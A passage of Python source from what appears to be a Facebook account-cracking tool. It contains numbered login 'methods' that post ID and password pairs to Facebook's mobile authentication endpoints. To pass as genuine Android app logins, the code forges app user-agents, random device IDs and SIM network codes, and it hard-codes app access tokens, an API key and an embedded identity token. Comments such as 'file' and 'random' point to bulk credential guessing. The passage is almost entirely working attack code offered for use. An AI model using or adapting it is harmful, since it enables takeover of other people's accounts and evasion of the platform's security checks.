"credentials_type": "password",
"source": "login",
"error_detail_type": "button_with_disabled",
"enroll_misauth": "false",
"generate_session_cookies": "1",
"generate_machine_id": "1",
"fb_api_req_friendly_name": "authenticate",}
headers={
"Accept-Encoding": "gzip, deflate",
"Accept": "*/*",
"Connection": "keep-alive",
"User-Agent": ua,
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-Friendly-Name": "authenticate",
"X-FB-Connection-Type": "unknown",
"Content-Type": "application/x-www-form-urlencoded",
"X-FB-HTTP-Engine": "Liger",
"Content-Length": "329",}
url = 'https://b-graph.facebook.com/auth/login'
twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
po = requests.post(url,data=data,headers=headers).json()
#_____________________method 15_____________________#rnd ok
#======================SH4MUL Tool Method ======================#
#file
data = {
'adid':adid,
'format':'json',
'device_id':device_id,
'email':ids,
'password':pas,
'generate_analytics_claims':'1',
'credentials_type':'password',
'source':'login',
'error_detail_type':'button_with_disabled',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'generate_machine_id':'1',
'meta_inf_fbmeta':'',
'currently_logged_in_userid':'0',
'fb_api_req_friendly_name':'authenticate',}
headers={
'Authorization':f'OAuth {accessToken}',
'X-FB-Friendly-Name':'authenticate',
'X-FB-Connection-Type':'unknown',
'User-Agent':ua,
'Accept-Encoding':'gzip, deflate',
'Content-Type': 'application/x-www-form-urlencoded',
'X-FB-HTTP-Engine': 'Liger'}
url = 'https://b-api.facebook.com/method/auth.login'
twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
po = requests.post(url,data=data,headers=headers).json()
#_____________________method 16_____________________#rnd ok
#======================SH4MULTool Method ======================#
#file
accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28','6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']

data = {
"adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
headers={
'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
url = 'https://b-graph.facebook.com/auth/login'
twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
po = requests.post(url,data=data,headers=headers).json()
#_____________________method 17_____________________#rnd ok
#======================SH4MULTool Method ======================#
#random
data = {
"adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
headers={
'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '45204',
'X-FB-SIM-HNI': '45201',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '698'}
url = 'https://b-graph.facebook.com/auth/login'
twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
po = requests.post(url,data=data,headers=headers).json()
#_____________________method 18_____________________#rnd ok
#======================SH4MULTool Method ======================#
#random
device_family_id = str(uuid.uuid4())
adid = str(uuid.uuid4())
machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
data = {'adid':adid,
'format':'json',
'device_id':device_family_id,
'email':ids,
'password':pas,
'generate_analytics_claim':'1',
'community_id':'','cpl':'true','try_num':'1',
'family_device_id':device_family_id,
'credentials_type':'device_based_login_password',
'generate_session_cookies':'1',
'error_detail_type':'button_with_disabled',
'source':'device_based_login',
'machine_id':machine_id,
'login_location_accuracy_m':'1.0',
'meta_inf_fbmeta':'',
'advertiser_id':adid,
'encrypted_msisdn':'',
'currently_logged_in_userid':'0',
'locale':'en_PK',
'client_country_code':'PK',
'method':'auth.login',
'fb_api_req_friendly_name':'authenticate',
'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
head = {
'content-type':'application/x-www-form-urlencoded',
'x-fb-sim-hni':str(random.randint(2e4,4e4)),
'x-fb-connection-type':'unknown',
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'api_key': '8114af471d039628db5c68cb127af936',
'user-agent':ua_string,
'x-fb-net-hni':str(random.randint(2e4,4e4)),
'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
'x-fb-connection-quality':'EXCELLENT',
'x-fb-friendly-name':'authenticate',
'accept-encoding':'gzip, deflate',
'x-fb-http-engine':'Liger'}
url = 'https://b-api.facebook.com/method/auth.login'
po = requests.post(url,data=data,headers=head,allow_redirects=False).text

#_____________________method 18_____________________#rnd ok
#======================SH4MULTool Method ======================#
#random

accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
data = {
'adid':adid,
'format':'json',
'device_id':device_id,
'email':ids,
'password':pas,
'generate_analytics_claims':'1',
'credentials_type':'password',
'source':'login',
'error_detail_type':'button_with_disabled',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'generate_machine_id':'1',
'fb_api_req_friendly_name':'authenticate',}
headers={
'Authorization':f'OAuth {accessToken}',
'X-FB-Friendly-Name':'authenticate',
'X-FB-Connection-Type':'unknown',
'User-Agent':ua,
'Accept-Encoding':'gzip, deflate',
'Content-Type': 'application/x-www-form-urlencoded',
'X-FB-HTTP-Engine': 'Liger'}
url = 'https://b-graph.facebook.com/auth/login'
twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
po = requests.post(url,data=data,headers=headers).json()

#_____________________method 18_____________________#
#======================SH4MULTool Method ======================#
#file
ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/69.0.0.26.76;FBBV/25862460;FBDM/{density=1.5,width=540,height=888};FBLC/es_LA;FBCR/AT&amp-T;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1021;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
device_id = str(uuid.uuid4())
adid = str(uuid.uuid4())
data = {'adid':adid,
        'email':ids,
        'password':pas,
        'cpl':'true',
        'credentials_type':'device_based_login_password',
        "source": "device_based_login",
        'error_detail_type':'button_with_disabled',
        'format':'json',
        'generate_session_cookies':'1',
        'generate_analytics_claim':'1',
        'generate_machine_id':'1',
        "family_device_id": str(uuid.uuid4()),
        "advertiser_id": str(uuid.uuid4()),
        "locale":"fr_DZ","client_country_code":"DZ",
        "device_id": str(uuid.uuid4()),
        "method": "auth.login",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
head = {
        'content-type':'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'user-agent':ua,
        'x-fb-net-hni':str(random.randint(2e4,4e4)),
        'x-fb-device-group': '5120',
        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
        'x-fb-connection-quality':'EXCELLENT',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'True',
        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
        'x-fb-friendly-name':'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'accept-encoding':'gzip, deflate',
        'x-fb-http-engine':     'Liger'}
url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
po = requests.post(url,data=data,headers=head,allow_redirects=False).text
q = json.loads(po)

#_____________________method 19_____________________#
#======================SH4MUL Tool Method ======================#
#file
ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{density=1.5,width=854,height=480};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
device_id = str(uuid.uuid4())
adid = str(uuid.uuid4())
data = {
        'adid':adid,
        'email':uid,
        'password':pas,
        'cpl':'true',
        'credentials_type':'device_based_login_password',
        "source": "account_recovery",
        'error_detail_type':'button_with_disabled',
        'format':'json',
        'sim_serials': "['80973453345210784798']",
        'openid_flow': 'android_login',
        'openid_provider': 'google',
        'openid_emails': "['01710940017']",
        'generate_session_cookies':'1',
        'generate_analytics_claim':'1',
        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
        'generate_machine_id':'1',
        "family_device_id": str(uuid.uuid4()),
        "advertiser_id": str(uuid.uuid4()),
        "locale":"fr_MA","client_country_code":"MA",
        "device_id": str(uuid.uuid4()),
        "method": "auth.login",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
head = {
        'content-type':'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'x-fb-sim-hni':'45204',
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'user-agent':ua,
        'x-fb-net-hni':'45201',
        'x-fb-device-group': '5120',
        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
        'x-fb-connection-quality':'EXCELLENT',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'True',
        'x-fb-friendly-name':'authenticate',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'accept-encoding':'gzip, deflate',
        'x-fb-http-engine':     'Liger'}
url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
po = requests.post(url,data=data,headers=head,allow_redirects=False).text
q = json.loads(po)
#_____________________method 20_____________________#
#======================SH4MUL Tool Method ======================#
#file
ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{density=1.5,width=854,height=480};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
ua = random.choice(UBI())
device_id = str(uuid.uuid4())
adid = str(uuid.uuid4())
data = {'adid':adid,
        'email':ids,
        'password':pas,
        'cpl':'true',
        'credentials_type':'device_based_login_password',
        "source": "device_based_login",
        'error_detail_type':'button_with_disabled',
        'format':'json',
        'generate_session_cookies':'1',
        'generate_analytics_claim':'1',
        'generate_machine_id':'1',
        "family_device_id": str(uuid.uuid4()),
        "advertiser_id": str(uuid.uuid4()),
        "locale":"fr_DZ","client_country_code":"DZ",
        "device_id": str(uuid.uuid4()),
        "method": "auth.login",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
head = {
        'content-type':'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'user-agent':ua,
        'x-fb-net-hni':str(random.randint(2e4,4e4)),
        'x-fb-device-group': '5120',
        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
        'x-fb-connection-quality':'EXCELLENT',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'True',
        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
        'x-fb-friendly-name':'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'accept-encoding':'gzip, deflate',
        'x-fb-http-engine':     'Liger'}
url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
po = requests.post(url,data=data,headers=head,allow_redirects=False).text
q = json.loads(po)
#_____________________method 21_____________________#
#======================SH4MUL Tool Method ======================#
#file
ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{density=1.5,width=854,height=480};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
device_id = str(uuid.uuid4())
adid = str(uuid.uuid4())
data = {'adid':adid,
        'email':ids,
        'password':pas,
        'cpl':'true',
        'credentials_type':'device_based_login_password',
        "source": "device_based_login",
        'error_detail_type':'button_with_disabled',
        'format':'json',
        'generate_session_cookies':'1',
        'generate_analytics_claim':'1',
        'generate_machine_id':'1',
        "family_device_id": str(uuid.uuid4()),
        "advertiser_id": str(uuid.uuid4()),
        "locale":"fr_DZ","client_country_code":"DZ",
        "device_id": str(uuid.uuid4()),
        "method": "auth.login",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
head = {
        'content-type':'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'user-agent':ua,
        'x-fb-net-hni':str(random.randint(2e4,4e4)),
        'x-fb-device-group': '5120',
        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
        'x-fb-connection-quality':'EXCELLENT',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'True',
        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
        'x-fb-friendly-name':'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'accept-encoding':'gzip, deflate',
        'x-fb-http-engine':     'Liger'}
url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
po = requests.post(url,data=data,headers=head,allow_redirects=False).text
q = json.loads(po)
#_____________________method 21_____________________#
#======================SH4MUL Tool Method ======================#
#file






